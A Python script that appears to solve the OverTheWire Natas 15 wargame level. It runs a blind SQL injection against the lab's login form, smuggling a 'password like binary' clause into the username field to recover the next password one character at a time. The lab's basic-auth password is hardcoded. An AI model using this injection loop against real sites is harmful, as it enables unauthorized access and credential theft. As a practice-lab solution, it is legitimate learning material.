#!/usr/bin/python3.9

import requests

def cracker():
    print("Start Cracking ... ")
    ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    url = "http://natas15.natas.labs.overthewire.org/index.php"
    basic_user="natas15"
    basic_password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
    passwd = ""
    while len(passwd) < 32:
        for c in ch:
            query = f'natas16" and password like binary "{passwd}{c}%" # '
            response = requests.post(url, data={"username":query}, auth=(basic_user, basic_password))
            print(f"Checked --> {c}")
            if "This user exists" in response.text:
                passwd+=c
                print("password --> ",passwd)
                
cracker()

